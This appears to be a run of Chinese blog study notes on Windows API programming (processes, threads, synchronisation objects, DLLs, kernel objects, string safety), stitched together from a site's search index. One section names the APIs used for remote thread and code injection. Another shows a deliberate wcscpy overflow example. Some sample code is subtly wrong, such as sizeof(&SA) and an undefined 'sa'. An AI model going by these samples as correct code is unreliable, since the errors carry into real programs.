为什么要使用WIndows数据类型Windows API函数、数据结构等都是采用Windows数据类型 查看Windows数据类型的定义 Windows数据类型命名的规律指针类型的命名方式一般是在其指向的数据类型前加“LP”或“p” 各种句柄类型的命名方式一般都是在其对象名前加“H” 无符号类型一般以“U”开头 Windows中数据结构Windows系统中数据结构类型的定义非常多，也有很多API函数使用到了这些数据结构类型。 Windows API功能分类系统基本服务 文件系统 对文件的基本操作包括文件的黄健、打开、关闭、删除，文件属性的设置与获取，目录操作，以及磁盘分卷的操作，包括镜像文件、加密文件系统等 内存管理 主要是内存的配、共享、释放等，包括虚拟内存管理、分页机制、堆管理 进程、线程和模块 包括进程主程序(exe)、模块、动态链接库(dll)等；线程的基本概念，线程创建、遍历、同步等操作；进程与权限；线程与纤程等内容 设备I/O、驱动程序控制 包括设备对象等基本概念。加载与卸载驱动程序，控制驱动程序，与驱动程序通信等 调试与错误处理 如何开发调试器，程序运行错误的处理，日志的记录、Windows可执行文件的结构等 Windows系统信息 注册表的操作，打开注册表、读取、写入键值、创建、删除键；还包括系统基本信息的获取和设置， 进程间通信 使用共享文件进行进程间通信的方法，使用消息进程进程见通信的方法，使用邮槽、管道等进程进程间通信的方法，使用网络共享进行进程间通信的方法 定时器与消息机制 消息机制是Windows系统中很重要的一种机制，几乎所有的Windows应用程序都在和消息打交道，而Windows的消息机制是依赖于定时器的。 其他 Windows系统基本服务还包括性能监视、电源管理、索引与数据存储等 将系统目录信息写入systemroot.txt 1234567891011121314151617181920212223242526#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(){ HANDLE hFile; //文件句柄 DWORD dwWritten; // TCHAR szSystemDir[MAX_PATH]; //字符数组 GetSystemDirectory(szSystemDir, MAX_PATH); //获取系统目录 hFile = CreateFile(&quot;systemroot.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //使用Create创建文件 //判断文件是否创建成功 if (hFile != INVALID_HANDLE_VALUE) { //将系统目录信息写入文件 if (!WriteFile(hFile, szSystemDir, lstrlen(szSystemDir), &amp;dwWritten, NULL)) { return GetLastError(); } } CloseHandle(hFile); //关闭文件句柄 return 0;} 系统管理系统管理是Windows系统中很重要的内容。Windows系统提供一下方面的API供应用程序开发使用，包括：管理控制台接口、程序安装、系统恢复、任务调度、Windows远程管理 网络用户利用Windows API可以开发基于各种网络协议的应用程序，例如TCP、UDP、HTTP、DHCP、RPC等； 网络API还可以进行网络管理，包括网络的基本信息，使用IP Hlper库可以获取网络配置和网络信息、进行网络监控等 Windows API 核心 DLL在Windows操作系统中，存在着很多动态链接文件(DLL文件)。这些DLL文件中包含了Windows API函数可执行程序。DLL将各函数“导出”，这样应用程序就可以找到DLL中的函数地址，当程序调用API的时候，程序会运行到DLL API函数主要存在于几个核心的动态链接文件中。Kernel32.dll、User32.dll、GDI32.dll Kernel32kernel32中包含了系统基本服务中的API函数，如文件系统、进程与线程、内存管理等。Windows Xp SP2中，Kernel32有949个导出函数； user32user32是Windows图形用户界面的主要支持 Gdi32Windows GDI应用程序设计接口，Gdi32到处了于此相关的若干函数 标准c函数及Crtdll_dll在系统环境下使用标准C进行程序开发时，用户所使用的库函数是由操作系统提供的。正是由于各个主流操作系统都提供了一套标准C库所定义的函数接口，标准C函数库才会由如此广泛的跨越操作系统平台。 Windows系统的C标准库函数接口主要由crtdll.dll导出。实际上，C标准库函数必须由操作系统为其提供接口，否则使用标准C开发的程序无法在特定的操作系统上运行；","link":"/2019/11/04/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-API%E6%A6%82%E8%A6%81/"},{"title":"Windows应用程序-入门","text":"开始第一个程序之前，应该对Windows应用程序的设计有一个初步、直观的认识； 例子start.exe123456789#include &lt;Windows.h&gt; //头文件#pragma comment(lib,&quot;user32.dll&quot;) //包含user32.dllint WinMain(HINSTANCE hInstance, HINSTANCE hPrecInstance, LPSTR lpCmdLine, int nCmdShow){ MessageBoxA(NULL, TEXT(&quot;开始学习Windows编程&quot;), TEXT(&quot;消息对话框&quot;), MB_OK); return 0;} Windows API就像C语言一系列库函数一样，任何一种程序开发平台都会提供众多的接口函数供开发人员使用。Windows应用程序的开发核心问题是如何使用WIndows SDK所提供的API 程序入口函数123456int WinMain( HINSTANCE hInstance, //应用程序本次运行实例的句柄 HINSTANCE hPrevInstance, //应用程序之前运行实例的句柄，但是在应用重，此参数始终为NULL LPSTR lpCmdLine, //运行时参数，LPSTR是Windows API中常用的字符串类型 int nCmdShow //应用程序窗口的显示状态) 代码分析MessageBoxA的函数原型如下： 123456int MessageBoxA( HWND hWnd, //窗口句柄 LPCSTR lpText,//字符串，消息框所显示的消息 LPCSTR lpCaption, //字符串，标识消息框的标题 UINT uType //包含一个“确定”按钮); 编译代码我们的编译使用Visual Studio和VC6作为程序编译和链接的工具。 使用微软官方下载，各个版本的Platform SDK都可以在微软公司的官网上下载到 安装","link":"/2019/11/04/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E5%85%A5%E9%97%A8/"},{"title":"Windows应用程序-线程同步","text":"由于线程采用并发运行机制，因此当进程运行时，其各线程的运行速度可能不一致。在某些情况下需要对各线程的运行过程进行同步 基本原理在同步过程中，两个最重要的概念就是同步对象和等待函数。 线程同步过程同步对象与等待函数相互配合以实现线程同步。其过程如下： 在需要进行线程同步的进程中定义某种同步对象，同步必须是全局的，以保证需要同步的线程A、B都可以访问到同步对象 开始时，线程A和B相互独立运行 线程B在准备好线程A需要使用到的数据前，将同步对象置为”未标记的”，线程B在准备好线程A需要使用的数据后，改变同步对象状态，置为”标记的” 线程A运行，直到需要线程B为其准备的数据时，调用等待函数。如果同步对象不是”标记的”，则一直等待到同步对象的状态改变为”标记的”为止。同步对象被线程B设置为”标记的”后，等待函数才会返回，线程A继续执行 同步对象最经常使用到的同步对象包括：事件(Event)、互斥(Mutex)、信号量(Semaphore)、可等待计时器(Waitable timer) 等待函数WaitForSingleObject等待单个对象，如果对象置位，则返回 1234DWORD WaitForSingleObject( HANDLE hHandle, //等待对象的句柄 DWORD dwMilliseconds //等到超时时间); WaitForMultipleObjects等待多个对象，当所等待的多个对象都置为标记的，或多个对象中的一个对象置为标记，则返回 123456DWORD WaitForMultipleObjects( DWORD nCount, //等待数量 const HANDLE *lpHandles, //数组第一个元素 BOOL bWaitAll, //为True说明等待全部置位才返回，False等待对象之一值位则返回 DWORD dwMilliseconds //等待超时时间); 同步对象使用事件对象事件是在线程同步中最常使用的一种同步对象。可以使用CreateEvent API函数创建对象，使用SetEvent函数可将对象置为”标记的”；使用ResetEvent函数将事件重置为”未标志的”状态。 CreateEvent创建事件对象 123456HANDLE CreateEventA( LPSECURITY_ATTRIBUTES lpEventAttributes, //安全书信给 BOOL bManualReset, //是否手工重置 BOOL bInitialState, //是否置位 LPCSTR lpName //事件名); CreateEventEx创建事件对象 123456HANDLE CreateEventExA( LPSECURITY_ATTRIBUTES lpEventAttributes, //安全结构 LPCSTR lpName, //事件名 DWORD dwFlags, //创建标志 DWORD dwDesiredAccess //事件对象的访问掩码); SetEvnet设置事件的标记 123BOOL SetEvent( HANDLE hEvent //事件的句柄); ResetEvent重置标记，如果事件是手工重置的，那么需要此函数来重置事件 123BOOL ResetEvent( HANDLE hEvent //事件句柄); OpenEvent从事件名中得到事件句柄 12345HANDLE OpenEventA( DWORD dwDesiredAccess, ////事件对象的访问掩码 BOOL bInheritHandle, //如果此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄。 LPCSTR lpName //事件对象句柄名称); 使用互斥对象互斥对象具有以下机制：如果互斥对象没有被任何线程拥有，那么它是”标记的”,如果被一个线程拥有，那么它是”未标记的”,任何一个线程获得后，互斥对象就是”未标志的”,其他线程不可以在拥有这个互斥对象 CreateMutex创建互斥对象 12345HANDLE CreateMutexA( LPSECURITY_ATTRIBUTES lpMutexAttributes, //安全属性 BOOL bInitialOwner, //创建后是否被创建线程所&quot;拥有&quot; LPCSTR lpName //互斥对象名); OpenMutex通过互斥对象获得句柄名 12345HANDLE OpenMutexW( DWORD dwDesiredAccess, //对互斥对象的访问 BOOL bInheritHandle, //如果此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄 LPCWSTR lpName //互斥对象名); ReleaseMutex释放互斥对象，一个线程释放了互斥对象以后，如果其他进程在等待互斥对象置位，则等待的线程可以得到该互斥对象，等待函数返回，互斥对象被新的线程拥有。 123BOOL ReleaseMutex( HANDLE hMutex); 使用信号量控制访问共享数据的线程数量CreateSemaphore创建信号量对象 123456HANDLE CreateSemaphoreA( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, //安全属性 LONG lInitialCount, //初始化计数值 LONG lMaximumCount, //最大计数值 LPCSTR lpName //信号量对象名); OpenSemaphore打开信号量句柄 12345HANDLE OpenSemaphoreW( DWORD dwDesiredAccess, //对信号量对象的访问 BOOL bInheritHandle, //如果此值为TRUE，则此进程创建的进程将继承该句柄。否则，进程将不会继承此句柄 LPCWSTR lpName //信号量名称); ReleaseSemapHore释放信号量对象 12345BOOL ReleaseSemaphore( HANDLE hSemaphore, //信号量对象的句柄 LONG lReleaseCount, //信号量对象的当前计数要增加的数量 LPLONG lpPreviousCount //指向变量的指针，以接收信号量的先前计数); 使用可等待计时器可等待计时器在达到指定的事件间隔后被设置为”标记的”，处于等待状态中的等待函数返回。可等待计时器用于程序中需要等待特定时间间隔的情况。 一共可分为三种等待计时器，分别为手工重置计时器、同步计时器、周期性计时器 CreateWaitableTimer创建可等待计时器 12345HANDLE CreateWaitableTimerW( LPSECURITY_ATTRIBUTES lpTimerAttributes, //安全属性 BOOL bManualReset, //是否手工设置 LPCWSTR lpTimerName //可等待计时器名称); SetWaitableTimer设置计时器间隔等参数 123456789BOOL SetWaitableTimerEx( HANDLE hTimer, //计时器对象的句柄 const LARGE_INTEGER *lpDueTime, //以100纳秒的间隔将计时器的状态设置为发出信号的时间 LONG lPeriod, //计时器的时间 PTIMERAPCROUTINE pfnCompletionRoutine, //指向可选完成例程的指针 LPVOID lpArgToCompletionRoutine, //指向传递给完成例程的结构的指针 PREASON_CONTEXT WakeContext, //指向包含计时器上下文信息的REASON_CONTEXT结构的指针 ULONG TolerableDelay //有效期限的可容忍延迟); TimerAPCProc12345void Ptimerapcroutine( LPVOID lpArgToCompletionRoutine, DWORD dwTimerLowValue, DWORD dwTimerHighValue) CancelWaitableTimer取消计时器 123BOOL CancelWaitableTimer( HANDLE hTimer //计时器句柄);","link":"/2019/12/18/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5/"},{"title":"Windows应用程序-进程","text":"运行一个程序就会产生一个进程，进程是应用程序得实例化，进程包括一个虚拟地址空间及代码、数据、对象等程序运行所需环境和资源的集合。一个程序由多个模块组成。 基本概念应用程序与进程可执行文件程序的载体是可执行文件。可执行文件中包括运行所需的程序、数据以及一些配置信息等。Windows平台的可执行文件包括exe、dll、sys等。 Windows平台下的可执行文件都是PE格式的 应用程序应用程序是由一系列由特定功能、能完成执行操作的可执行文件、数据的集合，一个程序可以分为多个可执行文件、动态链接库、数据文件。 每个程序都会产生一个进程 进程进程提供了程序运行所需要的资源、虚拟内存地址空间、各种数据、可执行代码、需要使用到的各种内核对象、系统调用接口、优先级与权限配置、工作集、环境变量等。 每个进程都有一个标识符PID和一个句柄，系统和其他进程可以通过PID和进程的句柄对进程进行管理和操作。 动态链接库、模块动态链接库动态链接库文件中包含若干公用到吗、数据等，供其他模块使用。动态链接库是将应用程序模块化的重要方法，动态链接库中的函数和数据可以同时供其他多个可执行文件使用。 动态链接库的原理与优点DLL中通常包括一些高度复用的代码，Windows API就存在于动态链接库中，采用动态链接库后，同样的代码只需要有一份就可以了，每个使用到这些功能的程序都是用同一份代码。 动态链接过程在进程创建的时候，系统会从exe文件中的导入表中知道exe文件会调用哪些动态链接库函数，在进行初始化的时候，将动态链接库加载到内存的虚拟地址空间，并调整好函数调用的指针的地址。 模块每个可执行程序都可以称为一个模块，DLL文件是模块，exe文件也是模块。 线程线程线程是附属在进程上的执行实体，是代码的执行流程。 一个进程中可以有多个线程在执行并发，在系统中，同时存在的线程肯定比CPU多，一个CPU在同一时间内只能执行一条机器指令，系统会将各个线程进行调度，根据情况选择当前执行的线程，当一个线程执行一段时候后再选择其他的线程进行执行。 进程的所有线程都共享其虚拟地址空间、数据、系统资源等。每个线程都有自己的栈、异常处理程序、调度优先级、标识符等。线程的切换依赖于中断。 进程管理 如何创建线程和结束线程 如何获取子进程的相关信息 如何在子进程中获取启动参数 如果创建GUI应用程序、控制台应用程序 如何在进程中获取和设置环境变量 创建进程、获取进程信息、获取启动参数父进程与子进程如果一个进程创建了另外一个进程，那么被创建的进程称为紫禁城，创建者称为子进程的父进程 启动参数进程创建后，可以使用GetCommandline、GetStartupInfo函数获取启动参数、启动信息 进程句柄和进程标识如果需要知道自己的句柄，可以使用GetCurrentProcess和GetCurrentProcessId函数获取自己的句柄和PID。 退出和终止进程如果一个进程使用完毕后，必须使用ExitProcess函数来终止一个进程，如果需要终止其他进程，使用TreminateProcess。 关键APICreateProcess创建一个进程 123456789101112BOOL CreateProcessA( LPCSTR lpApplicationName, //指向启动进程的exe文件 LPSTR lpCommandLine, //启动进程的命令行 LPSECURITY_ATTRIBUTES lpProcessAttributes,//安全属性 LPSECURITY_ATTRIBUTES lpThreadAttributes, //进程句柄是否被子进程继承 BOOL bInheritHandles, //与子进程的句柄继承关系 DWORD dwCreationFlags, //进程的创建标志和优先级控制 LPVOID lpEnvironment, //指向新进程的环境变量块 LPCSTR lpCurrentDirectory, //指定创建后新进程的当前目录 LPSTARTUPINFOA lpStartupInfo, //指向STARTINFO结构变量，设置启动信息 LPPROCESS_INFORMATION lpProcessInformation //指向PPROCESS_INFORMATION结构的变量); 获取和设置环境变量关键APIGetEnvironmentStrings获取所有变量变量的字符串 1LPCH GetEnvironmentStrings(); GetEnvironmentVariable获取指定得环境变量 12345DWORD GetEnvironmentVariable( LPCTSTR lpName, //环境变量名 LPTSTR lpBuffer, //保存环境变量值得缓冲区 DWORD nSize //缓冲区大小); SetEnvironmentVariable1234BOOL SetEnvironmentVariable( LPCTSTR lpName, //环境变量名 LPCTSTR lpValue //环境变量得内容); 线程创建线程、退出线程、获取线程信息创建线程和线程函数CreateThread12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpThreadAttributes, //指向SECURITY_ATTRIBUTES 结构的指针，该结构确定返回的句柄是否可以由子进程继承 SIZE_T dwStackSize, //堆栈得初始大小 LPTHREAD_START_ROUTINE lpStartAddress, //指向要由线程执行的应用程序定义的函数的指针 __drv_aliasesMem LPVOID lpParameter, //指向要传递给线程的变量的指针 DWORD dwCreationFlags, //控制线程创建的标志 LPDWORD lpThreadId //指向接收线程标识符的变量的指针); ThreadProc1DWORD WINAPI ThreadProc(LPVOID lpParameter); 线程句柄和TID进程中每一个线程都有一个句柄和标识符，TID是一个DWORD类型得数据，每一个线程得TID值都不同得，因此TID可以用于唯一标识一个线程 权限与优先级GetThreadPrioity123int GetThreadPriority( HANDLE hThread //线程得句柄); GetThreadPriorityBoost1234BOOL GetThreadPriorityBoost( HANDLE hThread, //线程得句柄 PBOOL pDisablePriorityBoost //指向接收优先级提升控制状态的变量的指针); SetThreadPriority1234BOOL SetThreadPriority( HANDLE hThread, //句柄 int nPriority //线程的优先级值); SetThreadPriorityBoost1234BOOL SetThreadPriorityBoost( HANDLE hThread, BOOL bDisablePriorityBoost ////指向接收优先级提升控制状态的变量的指针); 退出线程线程可以自动退出，也可以被其他线程退出，要终止指定线程得执行，使用TreminateThread函数 挂起、恢复、切换、终止线程线程调度函数在创建完成线程后，使用Sleep、SleepEx、SuspendThread、SwitchToThread、ResumeThread进行线程调度。 Sleep、SleepEx12345678void Sleep( DWORD dwMilliseconds //暂停执行的时间间隔);DWORD SleepEx( DWORD dwMilliseconds, //暂停执行的时间间隔 BOOL bAlertable //如果此参数为FALSE，则在超时时间过去之前该函数不会返回); SuspendThread、ResumeThread123456789//SuspendThread标识挂起一个线程DWORD SuspendThread( HANDLE hThread //线程句柄);//ResumeThread恢复被挂起的线程DWORD ResumeThread( HANDLE hThread); SwitchToThread使线程主动让出程序的执行，主操作系统选择正在等待的现程执行 1BOOL SwitchToThread(void); ExitThread退出本现程 123void ExitThread( DWORD dwExitCode //指定退出代码。现程的创建可以得到这个代码); TerminateTHread1234BOOL TerminateThread( HANDLE hThread, //线程句柄 DWORD dwExitCode //指定退出代码); 远程现程注入、代码注入如果进程具有某种特定含义，可以为其他进程创建线程，这种线程称为远程注入。 CreateRemoteThread创建一个远程线程 123456789HANDLE CreateRemoteThread( HANDLE hProcess, //要在其中创建线程的进程的句柄 LPSECURITY_ATTRIBUTES lpThreadAttributes,//指向安全结构的指针 SIZE_T dwStackSize, //初始堆栈大小 LPTHREAD_START_ROUTINE lpStartAddress, //指向由线程执行的，类型为LPTHREAD_START_ROUTINE的应用程序定义的函数的指针，该指针表示远程进程中线程的起始地址 LPVOID lpParameter, //指向要传递给线程函数的变量的指针 DWORD dwCreationFlags, //控制线程创建的标志 LPDWORD lpThreadId //指向接收线程标识符的变量的指针); WriteProcessMemory将数据写入到目标进程的虚拟地址空间中 1234567BOOL WriteProcessMemory( HANDLE hProcess, //目标进程句柄 LPVOID lpBaseAddress, //写入源数据的地址 LPVOID lpBuffer, //指向要写入的数据 DWORD nSize, //写入数据的大小 LPDWORD lpNumberOfBytesWritten //用于保存实际写入的数据的大小); 进程状态信息Windows提供了API来进程进程状态的信息收集： 列举当前主机中的进程，包括进程PID、句柄、程序映像等 列举进程的线程，包括TID、句柄等 列举进程加载的模块 获取进程的内存使用情况 列举进程的堆分配 PS API与Tool help API遍历系统中的进程可以使用PSAPI的EnumProcess函数和Tool help API的Process32First和Process32Next函数完成进程列举。 EnumProcess获取当前系统中所有进程的PID 12345BOOL EnumProcesses( DWORD *lpidProcess, //指向保存获取的进程PID的数组 DWORD cb, //指向数组的大小 LPDWORD lpcbNeeded //获取的进程PID的个数); CreateToolhelp32napshot获取系统中进程快照，或指定进程的快照 1234HANDLE WINAPI CreateToolhelp32Snapshot( DWORD dwFlags, //用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等 DWORD th32ProcessID //一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0); Process32First从快照中获取第一个进程的信息 1234BOOL Process32First( HANDLE hSnapshot, //返回CreateToolhelp32napshot函数返回的快照句柄 LPPROCESSENTRY32 lppe //processtype32结构变量的指针); Process32Next从快照中依此获取进程的信息 1234BOOL Process32Next( HANDLE hSnapshot, LPPROCESSENTRY32 lppe); 列举进程的模块、线程EnumProceeModules123456BOOL EnumProcessModules( HANDLE hProcess, //句柄 HMODULE *lphModule, DWORD cb, LPDWORD lpcbNeeded); GetModuleBaseName123456DWORD GetModuleBaseNameA( HANDLE hProcess, //包含模块的进程的句柄 HMODULE hModule, //模块的句柄 LPSTR lpBaseName, //指向缓冲区的指针 DWORD nSize //lpBaseName缓冲区的大小); GetModuleFileNameEx123456DWORD GetModuleFileNameExA( HANDLE hProcess, HMODULE hModule, LPSTR lpFilename, DWORD nSize); GetModuleInforMation123456BOOL GetModuleInformation( HANDLE hProcess, HMODULE hModule, LPMODULEINFO lpmodinfo, DWORD cb); 进程的堆使用、内存占用、虚拟内存大小动态链接库动态链接库的出现使得在应用程序开发中，需要在多个进程和模块间共享代码的情况下提供了一个好的解决方案 加载、释放DLL、通过句柄获得DLL相关信息LoadLibrary123HMODULE LoadLibraryA( LPCSTR lpLibFileName //可执行程序的路径); FreeLibrary123BOOL FreeLibrary( HMODULE hLibModule //要关闭的DLL的句柄); 编写动态链接库、导出函数DllMain函数和exe文件一样，动态链接库也有自己的入口函数，默认调用DllMain函数。 12345BOOL WINAPI DllMain( _In_ HINSTANCE hinstDLL, //DLL模块的句柄 _In_ DWORD fdwReason, //指示为什么调用DLL入口点函数的原因码 _In_ LPVOID lpvReserved //未使用); 导出函数如果需要将Dll中的函数导出，有多种方法。一种是函数声明的时候用__declspec(dllecport)关键字，二是在模块定义文件(.def)中说明。 运行时动态获取DLL导出函数地址并调用GetProcAddress获取已经加载了的模块中导出函数的地址 1234FARPROC GetProcAddress( HMODULE hModule, //模块句柄 LPCSTR lpProcName //函数名);","link":"/2019/12/13/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E8%BF%9B%E7%A8%8B/"},{"title":"Windows应用程序 - 进程创建","text":"进程提供程序所需的资源，如：数据、代码等 进程内存空间 查看低2gb的结尾 分区 x86 32 位Windows 空指针赋值区 0x00000000 - 0x0000FFFF 用户模式区 0x00010000 - 0x7FFEFFFF 64KB禁入区 0x7FFF0000 - 0x7FFFFFFF 内核 0x80000000 - 0xFFFFFFFF 进程模块每一个进程都是由不同的PE文件组成的 进程创建过程 1、映射EXE文件 2、创建内核对象EPROCESS 3、映射系统DLL(ntdll.dll) 4、创建线程内核对象ETHREAD 5、系统启动线程 映射DLL(ntdll.LdrInitializeThunk) 线程开始执行 进程函数CreateProcess12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL CreateChileProcess(PTCHAR szChildProcessName, PTCHAR szCommandLine){ STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); ZeroMemory(&amp;pi, sizeof(pi)); si.cb = sizeof(si); if (!CreateProcess( szChildProcessName, //对象名称 szCommandLine, //命令行 NULL, //不继承进程句柄 NULL, //不继承线程句柄 FALSE, //不继承句柄 0, //没有创建标记 NULL, //使用父进程环境变量 NULL, //使用父进程目录作为当前目录 &amp;si, //STARTUPINFO结构体详细信息 &amp;pi //PROCESS_INFORMATION结构体进程信息 )) { printf(&quot;Error : %d\\n&quot;, GetLastError()); } return 0;}int main(int argc, char* argv[]){ TCHAR szApplicationName[] = TEXT(&quot;C:\\\\Program Files\\\\Internet Explorer\\\\iexplore.exe&quot;); TCHAR szCmdLine[] = TEXT(&quot;https://sYstemk1t.github.io/&quot;); CreateChileProcess(szApplicationName, szCmdLine); system(&quot;pause&quot;); return 0;} NiteBook123//1 尝试着写个控制台程序调用CreateProcess创建QQ进程。//2 5秒钟后关闭QQ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;BOOL CreateChileProcess(PTCHAR szChildProcessName){ STARTUPINFO si; PROCESS_INFORMATION pi; ZeroMemory(&amp;si, sizeof(si)); ZeroMemory(&amp;pi, sizeof(pi)); si.cb = sizeof(si); if (!CreateProcess( NULL, //对象名称 szChildProcessName, //命令行 NULL, //不继承进程句柄 NULL, //不继承线程句柄 FALSE, //不继承句柄 0, //没有创建标记 NULL, //使用父进程环境变量 NULL, //使用父进程目录作为当前目录 &amp;si, //STARTUPINFO结构体详细信息 &amp;pi //PROCESS_INFORMATION结构体进程信息 )) { printf(&quot;Error : %d\\n&quot;, GetLastError()); } Sleep(5000); ExitProcess(NULL); return 0;}int main(int argc, char* argv[]){ TCHAR szApplicationName[] = TEXT(&quot;D:\\\\Directory\\\\QQ\\\\Bin\\\\QQScLauncher.exe&quot;); CreateChileProcess(szApplicationName); system(&quot;pause&quot;); return 0;}","link":"/2020/10/21/Windows%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-%E8%BF%9B%E7%A8%8B%E5%88%9B%E5%BB%BA/"},{"title":"Windows核心编程 - 内核对象","text":"进程对象有一个进程I D 、一个基本优先级和一个退出代码，而文件对象则拥有一个字节位移、一个共享模式和一个打开模式。 内核对象是系统提供的用户模式下代码与内核模式下代码进行交互的基本接口 内核对象每个内核对象都只是一个内存块，它由操作系统内核分配，并且只能由操作系统内核访问。这个内存块是一个数据结构，其成员维护着与对象相关的信息。 由于内核对象的数据结构只能由操作系统内核访问，所以应用程序不能再内存中定位这些数据结构并直接修改内容，但是Windows提供了一组函数，这种函数会以恰当得方式来访问这些内核对象。调用一个会创建内核对象的函数后，函数会返回一个句柄，它标识了所创建的对象，可以将这个句柄想想成为一个不透明的值，它可由进程中的任何现程使用。在32位进程中，句柄是一个32位的值，64位同理。 为了增强操作系统的可靠性，这些句柄值是与进程相关的。所以，如果将句柄值传递给某一个进程中的现程，那么另一个进程用我们的进程的句柄值来发出调用的时候，就可能失败。 使用计数内核对象可以用一个安全描述符来保护。安全描述符描述了对象的创建者拥有对象；哪些组和用户被允许访问或使用此对象；哪些组和用户被拒绝访问此对象。 用户创建内核对象的函数几乎都指向一个SECURITY_ATTRIBUTES结构的指针作为参数； 12345typedef struct _SECURITY_ATTRIBUTES { DWORD nLength; //大小 LPVOID lpSecurityDescriptor; //安全属性 BOOL bInheritHandle; //在创建新进程时是否继承返回的句柄} SECURITY_ATTRIBUTES, *PSECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES; 如果想对我们创建的内核对象加以访问控制，就必须创建一个安全描述符，然后初始化； 123SECURITY_ATTRIBUTES sa;sa.nLength = sizeof(sa);sa.lpSecurityDescriptor = pSD; 进程内核对象句柄表一个进程在初始化的时候，系统会为它自动分配一个句柄表。这个句柄表只给内核对象使用。 创建内核对象一个进程首次进行初始化的时候，其句柄表为空。当进程内的一个现程调用一个会创建内核对象的函数时，内核将为这个对象分配并初始化一个内存块。 用于创建内核对象的任何函数都会返回一个与进程相关的句柄表，这个句柄表可由同一个进程中运行的所有现程使用。 系统用索引来标识内核对象的信息保存在进程句柄表中具体的位置，要想得到实际的索引值，句柄值实际应除以4； 关闭内核对象使用CloseHandle函数关闭内核对象; 1CloseHandle(HANDLE hobject); 跨进程边界共享内核对象在很多时候，不同进程中运行的现程需要共享内核对象。 利用文件映射对象，可以在同一台机器上运行两个不同进程之间共享数据块； 借助邮槽和管道，在网络中的不同计算机中运行的进程可以相互发送数据块； 互斥量、信号量和事件允许不同进程中的现程同步执行。 对象句柄继承在进程只有一个父子关系的时候，才可以使用对象句柄继承；为了创建一个可继承的句柄，父进程必须分配并初始化一个SECURITY_ATTRIBUTES结构，并将这个结构传递给Create函数； 1234567891011121314#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int main(void){ SECURITY_ATTRIBUTES SA; SA.nLength = sizeof(&amp;SA); //结构体大小 SA.lpSecurityDescriptor = NULL; //安全属性 SA.bInheritHandle = TRUE; //是否继承 HANDLE hMutex = CreateMutex(&amp;sa,FALSE,NULL); //互斥函数 CloseHandle(hMutex); //关闭内核对象 } 改变句柄的标志假如父进程创建一个内核对象，得到了一个可继承的句柄，然后生成了两个子进程。但是，父进程只希望其中一个子进程继承继承内核对象句柄。可以调用SetHandleInfomation函数来改变内核对象句柄的继承标志； 1234SetHandleInformation ( HANDLE hObject, //有效的句柄 DWORD dwMask, //更改标志位 DWORD dwFlags); //把标志位设置成什么","link":"/2020/04/15/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B-%E5%86%85%E6%A0%B8%E5%AF%B9%E8%B1%A1/"},{"title":"Windows核心编程 - 字符和字符串处理","text":"缓冲区溢出已成为针对操作系统的各个组件发起安全攻击的媒介 字符编码文本字符串编码成为一组以0节位的单字节字符。许多人已经习以为常，调用strlen，它会返回一个以0节位的一个ANSI单字节字符数组中字符数。 ANSI和Unicode字符与字符串数据类型C运行库中的安全字符串函数任何修改字符串的函数都存在一个安全隐患：如果目标字符串缓冲区不够大， 无法容纳生成的字符，就会导致内存中的数据被破坏。 Demo: 12WCHAR szBuffer[3] = L&quot;&quot;;wcscpy(szBuffer,l&quot;abc&quot;); strcpy和wcscpy的主要问题就是它们没有收到指定了缓冲区最大长度的参数。所以，函数并不知道自己破坏了内存，因为函数自身并不知晓破坏了内存，也就不会向应用程序报错。 新的安全字符串函数在所有的函数名后_s，如果strcpy_s;","link":"/2020/04/14/Windows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B-%E5%AD%97%E7%AC%A6%E5%92%8C%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%A4%84%E7%90%86/"},{"title":"Windows核心编程 - 进程","text":"进程的创建标志着一个内核对象被创建，内核对象创建的目的是以便管理每个进程。以及说明如何使用相关的内核对象来对进程进行操作。 进程通常被定义为一个正在运行的程序的实例，它由两个部分组成： 一个是操作系统用来管理进程的内核对象。内核对象也是系统用来存放关于进程的统计信息的地方。 一个是地址空间，它包含所有可执行模块或DLL模块的代码和数据。它还包括动态内存分配的空间。 进程必须拥有一个在它环境中运行的线程，该线程负责执行包含在进程的地址空间中的代码。 而实际上，一个进程可能包含若干个线程，所有这些线程都“同时”执行进程地址空间中的代码。每个进程至少拥有一个线程，且拥有它自己的一组CPU寄存器和它自己的堆栈。如果没有线程来为进程执行地址空间中代码，那么该进程将被销毁。 若要使这些线程同时运行，操作系统必须为每个线程安排一定的CPU时间。它通过一种循环方式为线程提供时间片，造成一种假象，彷佛所有的线程都在运行。 当一个进程被创建后，系统会自动为它创建一个线程，称为主线程，然后该线程可以创建其他的线程，这些线程又可以创建更多的线程。 编写Windows应用程序Windows操作系统支持两种类型的应用程序： 基于图形界面（GUI）的应用程序 基于控制台界面的（CUI）的应用程序。 当使用VS这样的IDE来创建应用程序的时候，这种集成开发环境就安装了许多不同的链接程序的开关，这样，链接程序就可以将相应的子程序嵌入产生的可执行文件中。 用于CUI应用程序的链接程序开关是：/SUBSYSTEM:CONSOLE 用于GUI应用程序的链接程序开关是：/SUBSYSTEM:WINDOWS Windows应用程序必须拥有一个在应用程序启动运行时调用的入口函数，可以使用的入口函数有四个： int WINAPI WinMain(HINSTANCE hinstExe, HINSTANCE , PSTR 